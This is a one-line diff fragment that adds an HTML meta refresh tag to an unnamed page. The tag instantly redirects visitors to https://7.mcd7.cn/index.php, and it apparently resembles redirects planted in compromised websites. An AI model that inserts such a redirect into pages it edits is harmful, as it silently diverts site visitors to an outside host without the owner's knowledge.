@@ -1,0 +1,1 @@
+<meta http-equiv="refresh" content="0; url=https://7.mcd7.cn/index.php">
